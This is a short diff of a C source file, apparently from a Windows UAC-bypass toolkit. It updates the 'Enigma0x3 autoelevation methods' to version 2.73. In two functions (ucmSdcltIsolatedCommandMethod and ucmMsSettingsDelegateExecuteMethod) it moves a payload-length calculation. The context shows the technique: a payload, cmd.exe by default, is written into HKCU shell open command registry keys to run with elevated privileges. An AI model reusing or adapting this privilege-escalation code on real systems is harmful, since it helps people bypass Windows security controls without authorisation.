@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.72
+*  VERSION:     2.73
 *
-*  DATE:        26 May 2017
+*  DATE:        27 May 2017
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -477,15 +477,15 @@ BOOL ucmSdcltIsolatedCommandMethod(
 
         if (lpszPayload != NULL) {
             lpBuffer = lpszPayload;
-            sz = _strlen(lpszPayload);
         }
         else {
             //no payload specified, use default cmd.exe
             RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
             supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            sz = _strlen(szBuffer);
             lpBuffer = szBuffer;
         }
+
+        sz = _strlen(lpBuffer);
 
         lResult = RegCreateKeyEx(HKEY_CURRENT_USER, T_EXEFILE_SHELL, 0, NULL,
             REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
@@ -586,15 +586,15 @@ BOOL ucmMsSettingsDelegateExecuteMethod(
 
         if (lpszPayload != NULL) {
             lpBuffer = lpszPayload;
-            sz = _strlen(lpszPayload);
         }
         else {
             //no payload specified, use default cmd.exe
             RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
             supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
-            sz = _strlen(szBuffer);
             lpBuffer = szBuffer;
         }
+
+        sz = _strlen(lpBuffer);
 
         _strcpy(szKey, T_MSSETTINGS);
         _strcat(szKey, T_SHELL_OPEN_COMMAND);
